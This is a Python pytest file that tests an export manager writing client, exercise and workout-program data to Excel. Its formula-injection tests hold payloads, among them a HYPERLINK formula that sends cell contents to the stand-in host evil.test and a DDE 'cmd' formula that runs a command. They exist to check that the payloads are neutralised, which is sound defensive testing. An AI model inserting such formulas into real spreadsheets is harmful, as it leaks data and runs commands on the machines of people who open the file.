"""Tests for the export manager."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import httpx
import pytest
from openpyxl import Workbook

from kahunas_client.mcp.export import (
    ExportManager,
    _cell,
    _neutralise_formula,
    _sheet_title,
    _titled_sheet,
)


class TestSheetTitle:
    """Worksheet titles must satisfy Excel's stricter naming rules."""

    def test_clean_name(self) -> None:
        assert _sheet_title("John Doe") == "John Doe"

    def test_replaces_characters_excel_rejects(self) -> None:
        assert _sheet_title("a[b]c:d*e?f/g\\h") == "a_b_c_d_e_f_g_h"

    def test_truncates_to_excel_limit(self) -> None:
        assert len(_sheet_title("x" * 60)) == 31

    def test_falls_back_when_nothing_survives(self) -> None:
        assert _sheet_title("", fallback="Rest Day") == "Rest Day"
        assert _sheet_title(":::", fallback="Rest Day") == "Rest Day"

    def test_accepted_by_openpyxl(self) -> None:
        """The point of the stricter rules is that openpyxl will not reject them."""
        wb = Workbook()
        sheet = _titled_sheet(wb, _sheet_title("Day 1: Push/Pull [A]*"))
        assert sheet.title == "Day 1_ Push_Pull _A__"


class TestFormulaInjection:
    """Client supplied text must not be evaluated as a spreadsheet formula."""

    @pytest.mark.parametrize(
        "payload",
        [
            "=1+1",
            '=HYPERLINK("http://evil.test?d="&A1,"click")',
            "+1+1",
            "-1+1",
            "@SUM(A1)",
            "\tvalue",
            "\rvalue",
        ],
    )
    def test_dangerous_prefixes_are_neutralised(self, payload: str) -> None:
        neutralised = _neutralise_formula(payload)
        assert neutralised == f"'{payload}"
        assert not str(neutralised).startswith(("=", "+", "-", "@", "\t", "\r"))

    @pytest.mark.parametrize("value", ["John Doe", "", "note about -5 kg", "3 = 3"])
    def test_ordinary_text_is_untouched(self, value: str) -> None:
        assert _neutralise_formula(value) == value

    @pytest.mark.parametrize("value", [1, 2.5, None, True])
    def test_non_strings_stay_typed(self, value: object) -> None:
        """Genuine numbers must remain numeric, not become quoted text."""
        assert _neutralise_formula(value) is value

    def test_cell_writes_go_through_the_mitigation(self) -> None:
        wb = Workbook()
        ws = _titled_sheet(wb, "Data")
        _cell(ws, row=1, column=1, value="=cmd|'/c calc'!A1")
        assert ws.cell(row=1, column=1).value == "'=cmd|'/c calc'!A1"

    def test_cell_preserves_numeric_values(self) -> None:
        wb = Workbook()
        ws = _titled_sheet(wb, "Data")
        _cell(ws, row=1, column=1, value=82.5)
        assert ws.cell(row=1, column=1).value == 82.5


class TestExportManager:
    def _mock_client(self) -> MagicMock:
        client = MagicMock()
        # Mock all methods as async
        client.get_client_action = AsyncMock(
            return_value=httpx.Response(
                200,
                json={
                    "data": {
                        "first_name": "John",
                        "last_name": "Doe",
                        "email": "john@test.com",
                        "uuid": "c1",
                    },
                },
            )
        )
        client.list_clients = AsyncMock(return_value=httpx.Response(200, json={"data": []}))
        client.list_habits = AsyncMock(return_value=httpx.Response(200, json={"habits": []}))
        client.get_chat_messages = AsyncMock(
            return_value=httpx.Response(200, json={"messages": []})
        )
        client.get_chart_data = AsyncMock(return_value=httpx.Response(200, json={"data": []}))
        client.list_exercises = AsyncMock()
        client.list_workout_programs = AsyncMock()
        return client

    async def test_export_client_creates_directory(self, tmp_path: Path) -> None:
        client = self._mock_client()
        mgr = ExportManager(client)
        path = await mgr.export_client("c1", output_dir=str(tmp_path))
        assert path.exists()
        assert (path / "profile.xlsx").exists()

    async def test_export_client_name_from_data(self, tmp_path: Path) -> None:
        client = self._mock_client()
        mgr = ExportManager(client)
        path = await mgr.export_client("c1", output_dir=str(tmp_path))
        assert "John Doe" in str(path)

    async def test_export_exercise_library(self, tmp_path: Path) -> None:
        client = self._mock_client()
        from kahunas_client.models import Exercise, ExerciseListData, Pagination

        client.list_exercises = AsyncMock(
            return_value=ExerciseListData(
                exercises=[
                    Exercise(exercise_name="Bench Press", exercise_type=1, tags=["chest"]),
                    Exercise(exercise_name="Running", exercise_type=2),
                ],
                total_records=2,
                pagination=Pagination(total=2),
            )
        )
        mgr = ExportManager(client)
        path = await mgr.export_exercise_library(output_dir=str(tmp_path))
        assert path.exists()
        assert path.name == "exercise_library.xlsx"

    async def test_export_workout_programs(self, tmp_path: Path) -> None:
        client = self._mock_client()
        from kahunas_client.models import (
            Pagination,
            WorkoutDay,
            WorkoutProgramDetail,
            WorkoutProgramDetailData,
            WorkoutProgramListData,
            WorkoutProgramSummary,
        )

        client.list_workout_programs = AsyncMock(
            return_value=WorkoutProgramListData(
                workout_plan=[WorkoutProgramSummary(uuid="p1", title="PPL")],
                total_records=1,
                pagination=Pagination(total=1),
            )
        )
        client.get_workout_program = AsyncMock(
            return_value=WorkoutProgramDetailData(
                workout_plan=WorkoutProgramDetail(
                    uuid="p1",
                    title="PPL",
                    workout_days=[WorkoutDay(title="Day 1 - Push", is_restday=0)],
                )
            )
        )
        mgr = ExportManager(client)
        path = await mgr.export_workout_programs(output_dir=str(tmp_path))
        assert path.exists()
        assert (path / "PPL.xlsx").exists()

    async def test_export_all_clients_empty(self, tmp_path: Path) -> None:
        client = self._mock_client()
        mgr = ExportManager(client)
        path = await mgr.export_all_clients(output_dir=str(tmp_path))
        assert path.exists()
        assert (path / "clients_summary.xlsx").exists()
